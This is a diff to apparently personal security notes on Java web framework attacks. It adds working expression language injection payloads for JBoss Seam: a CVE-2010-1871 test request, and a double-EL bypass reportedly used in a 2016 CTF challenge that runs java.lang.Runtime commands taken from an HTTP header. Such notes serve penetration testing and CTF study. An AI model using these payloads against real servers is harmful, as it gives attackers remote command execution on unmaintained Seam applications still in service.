@@ -197,7 +197,7 @@ malveillantes :
     }
   }
 
-# java server faces (JSF)
+# jsf - Java Server Faces
 * decode viewstate
 https://github.com/SpiderLabs/deface.git (https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2010-001/?fid=3765)
 
@@ -205,11 +205,34 @@ https://github.com/SpiderLabs/deface.git (https://www.trustwave.com/Resources/Se
 POET
 Inyourface
 
+# jsf/seam
 * expression language injection via remote inclusion
 <body>
 <p>${"".getClass().forName('java.lang.Runtime').getDeclaredMethods()[14].invoke("".getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null), param.test)}</p>
 </body>
 http://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html used by the JSF framework
+
+* EL injection via actionOutcome (CVE-2010-1871)
+http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html https://bugzilla.redhat.com/show_bug.cgi?id=615956 http://www.cvedetails.com/cve/CVE-2010-1871/
+
+test: GET /vuln/home.seam?actionOutcome=/pwn.xhtml%3fpwned%3d%23{expressions.getClass().forName('java.lang.Runtime')}
+vuln: Location: /vuln/pwn.seam?pwned=class+java.lang.Runtime
+fix: developers blacklisted # and { characters in actionOutcome, but can be bypassed via actionMethod + double EL injection
+
+* actionMethod + double EL injection
+someone hinted it would be possible back in 2010 http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html?showComment=1285586160417#c3222807404834356400
+the bypass 0day was exploited during hitcon-ctf-quals-2016 Angry Seam
+
+update user description to: /?a=#{expressions.instance().createValueExpression(request.getQueryString()).getValue()}
+then access /angryseam/template.seam?x=#{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),request.getHeader('Cmd'))}&actionMethod=template.xhtml:util.escape(sessionScope['user'].getDescription()) + send header Cmd: ping blah
+
+1st condition: need a page that will eval actionMethod=
+2nd condition: need another page to store our first EL
+
+https://github.com/seam2/jboss-seam/blob/f3077fee9d04b2b3545628cd9e6b58c859feb988/jboss-seam/src/main/java/org/jboss/seam/navigation/Pages.java#L674
+line 708 is the first evaluation and line 710 will evaluate again
+
+forever vuln because not maintained anymore: https://github.com/seam2/jboss-seam/commit/965d4f3ea4dd527a41402f4758878de02d5ede7d
 
 # spring
 https://docs.google.com/document/d/1dc1xxO8UMFaGLOwgkykYdghGWm_2Gn0iCrxFsympqcE/edit
